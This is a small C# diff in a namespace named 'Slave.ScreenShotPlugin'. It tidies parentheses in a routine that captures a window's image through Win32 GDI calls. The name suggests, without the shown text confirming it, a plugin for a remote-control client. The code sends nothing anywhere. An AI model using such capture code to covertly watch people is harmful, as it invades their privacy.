@@ -55,7 +55,7 @@ namespace Slave.ScreenShotPlugin
 				rec = new Rect();
 				Bitmap myBitmap;
 				myBitmap = new Bitmap(640, 480);
-				if ((hWnd.ToInt32() != 0) && (IsWindow(hWnd)))
+				if (hWnd.ToInt32() != 0 && IsWindow(hWnd))
 				{
 					hWindowDc = GetWindowDC(hWnd);
 					if (hWindowDc.ToString() != null)
@@ -73,7 +73,7 @@ namespace Slave.ScreenShotPlugin
 									hOldBmp = SelectObject(new IntPtr(hOffscreenDc), new IntPtr(hBitmap));
 									BitBlt(new IntPtr(hOffscreenDc), 0, 0, (int)nWidth, (int)nHeight, new IntPtr(hWindowDc), 0, 0, 13369376);
 									myBitmap = Image.FromHbitmap(new IntPtr(hBitmap));
-									DeleteObject(new IntPtr((SelectObject(new IntPtr(hOffscreenDc), new IntPtr(hOldBmp)))));
+									DeleteObject(new IntPtr(SelectObject(new IntPtr(hOffscreenDc), new IntPtr(hOldBmp))));
 								}
 								DeleteDC(new IntPtr(hOffscreenDc));
 							}
